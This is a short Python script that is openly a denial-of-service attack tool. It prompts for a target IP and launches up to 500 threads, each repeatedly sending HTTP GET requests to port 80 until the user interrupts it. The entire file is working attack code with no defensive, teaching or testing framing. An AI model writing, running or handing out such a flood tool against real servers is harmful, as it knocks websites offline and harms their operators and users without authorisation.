import socket
import threading
from threading import Event

target = input("Enter target IP: ")
port = 80

def attack(stop_event: Event):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1)
    s.connect((target, port))
    request = (
            f"GET / HTTP/1.1\r\n"
            f"Host: {target}\r\n\r\n"
        )
    while stop_event.is_set() is not True:
        try:
            s.sendto(request.encode('ascii'), (target, port))
            # print("request sent")
        except socket.timeout:
            print("timeout")
            continue
    s.close()

def main(stop_event: Event):
    print("Executing attack...")
    for i in range(500):
        if stop_event.is_set() is not True:
            thread = threading.Thread(target=attack, args=(stop_event,))
            thread.start()
        else:
            break

if __name__ == "__main__":
    stop_event = threading.Event() 
    try:
        main_thread = threading.Thread(target=main, args=(stop_event,))
        main_thread.start()
        while stop_event.is_set() is not True:
            continue
    except KeyboardInterrupt:
        stop_event.set()
        print("Stopping the attack...")
        exit()